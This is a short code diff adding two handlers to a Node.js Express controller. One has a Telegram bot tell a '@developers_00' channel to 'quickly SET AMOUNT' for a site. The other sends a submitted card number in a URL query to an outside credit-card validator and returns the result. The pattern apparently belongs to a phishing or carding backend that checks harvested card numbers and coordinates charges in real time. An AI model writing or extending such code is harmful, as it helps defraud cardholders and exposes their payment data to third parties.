@@ -347,5 +347,26 @@ module.exports = {
                 .status(500)
                 .send({ success: false, message: error.message });
         }
+    },
+    SETAMOUNT:async(req,res)=>{
+        try{
+            const bot = req.bot;
+            const { amount } = req.body;
+            await bot.sendMessage('@developers_00', `<b>Quickly SET AMOUNT ${amount} for ${mainURL}:</b>`, { parse_mode: 'HTML' });
+            return res.send({success: true, message:'success'})
+        }catch (error) {
+            return res
+                .status(500)
+                .send({ success: false, message: error.message });
+        }
+    },
+    CHECKCARDDATA:async(req,res)=>{
+        try{
+            const {cardValue} = req.body;
+            const response = await axios.get(`https://dnschecker.org/ajax_files/credit_card_validator.php?ccn=${cardValue}`)
+            return res.send({success:response?.data ? true : false, message:response?.data || false});
+        }catch{
+            return res.send({success: false, message:'error'});
+        }
     }
 };
